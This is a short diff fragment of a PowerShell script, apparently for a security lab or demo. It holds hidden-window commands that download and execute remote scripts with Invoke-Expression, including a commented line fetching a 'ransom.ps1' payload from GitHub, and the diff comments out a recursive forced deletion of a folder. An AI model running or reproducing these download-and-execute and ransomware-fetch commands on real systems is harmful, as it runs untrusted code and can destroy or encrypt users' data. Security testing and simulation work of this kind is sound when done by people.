@@ -18,4 +18,4 @@ powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebCl
 #ransom
 #powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/ransom.ps1')"
 
-Remove-Item C:\TTDemo -Recurse -Force
+#Remove-Item C:\TTDemo -Recurse -Force
